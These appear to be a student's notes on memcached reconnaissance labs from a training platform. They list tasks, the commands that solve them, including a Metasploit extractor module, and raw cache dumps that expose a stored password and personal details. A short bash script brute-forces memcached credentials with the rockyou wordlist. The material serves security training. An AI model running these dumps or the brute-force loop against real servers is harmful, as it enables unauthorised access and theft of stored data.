Footprinting (https://pentest-standard.readthedocs.io/en/latest/intelligence_gathering.html#footprinting) 
Memcache Reconnaissance for Red-Blue Teams (https://www.pentesteracademy.com/course?id=45) 
Web Application Pentesting (https://www.pentesteracademy.com/course?id=5) 



Memcached Recon: Basics
https://attackdefense.com/challengedetails?cid=512

Find the version of memcached server using nmap. - 
Find the version information using netcat or telnet.
Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.
Find the number of current items on the memcached server using memcstat.    --> memcstat --servers 192.77.235.3 | grep item
Find the value stored in the key 'flag' from the key value pairs dumped by available Metasploit module.     --> use auxiliary/gather/memcached_extractor
Find the name of all keys present on the memcached server using memcdump.   --> memcdump --servers=192.77.235.3 | wc -l
Find the value stored in key “first_name” using memcached-tool.     --> /usr/share/memcached/scripts/memcached-tool --servers=192.77.235.3:11211 dump


Memcacched Recon: Directroy Attack
https://attackdefense.com/challengedetails?cid=513

#version
VERSION 1.5.12
#stats items
STAT items:1:number 10
STAT items:1:number_hot 0
STAT items:1:number_warm 1
STAT items:1:number_cold 9
STAT items:1:age_hot 0
STAT items:1:age_warm 327
STAT items:1:age 1028
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 2
STAT items:1:expired_unfetched 1
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 50
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 10
STAT items:1:moves_to_warm 1
STAT items:1:moves_within_lru 2
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 1
STAT items:1:hits_to_warm 2
STAT items:1:hits_to_cold 2
STAT items:1:hits_to_temp 0
END
#stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 9
STAT 1:free_chunks 10913
STAT 1:free_chunks_end 0
STAT 1:mem_requested 663
STAT 1:get_hits 11
STAT 1:cmd_set 21
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048576
END
#stats cachedump 1 0                    ===> stats cachedump [slab-id] [no of line dump, 0-means all lines]
ITEM password [7 b; 0 s]
ITEM country [13 b; 0 s]
ITEM zip [5 b; 0 s]
ITEM state [8 b; 0 s]
ITEM city [10 b; 0 s]
ITEM address [14 b; 0 s]
ITEM nick_name [3 b; 0 s]
ITEM last_name [5 b; 0 s]
ITEM first_name [5 b; 0 s]
END
#stats cachedump 1 2
ITEM password [7 b; 0 s]
ITEM country [13 b; 0 s]
END
#stats cachedump 1 1
ITEM password [7 b; 0 s]
END
#get password
VALUE password 0 7
pass123
END
#get address
VALUE address 0 14
8188 Yukon St.
END
#get password
VALUE password 0 7
pass123
END
#get nick_name
VALUE nick_name 0 3
Jim
END
#get last_name
VALUE last_name 0 5
Frank
END
#get first_name
VALUE first_name 0 5
Jimmy
END
#get city
VALUE city 0 10
Mount Airy
END


# memcstat --servers 192.77.235.3 | grep item

# msfconsole
# use auxiliary/gather/memcached_extractor
# set RHOST x.x.x.x
# exploit

# memcdump --servers=192.77.235.3 | wc -l

# /usr/share/memcached/scripts/memcached-tool --servers=192.77.235.3:11211 dump


==> recon-cachingserver
Memcached Recon: Dictionary Attack (recon-cachingserver)
https://attackdefense.com/challengedetails?cid=513

Tasks:
    Find the password of memcached user "student". Use /usr/share/wordlists/rockyou.txt.gz wordlist.
    Find the number of key value pairs on the memcached server.
    Find the value stored in the key 'flag' on the memcached server.

------------------------------------------------------------------------------------
# memcache-dictionary-attack.sh
#! /bin/bash
while read F ; 
do echo "Trying $F"
    if memcstat --servers=$1 --username=$2 --password=$F | grep -q Server ; then
    echo "Password Found: "$F
    break
fi
done < $3
------------------------------------------------------------------------------------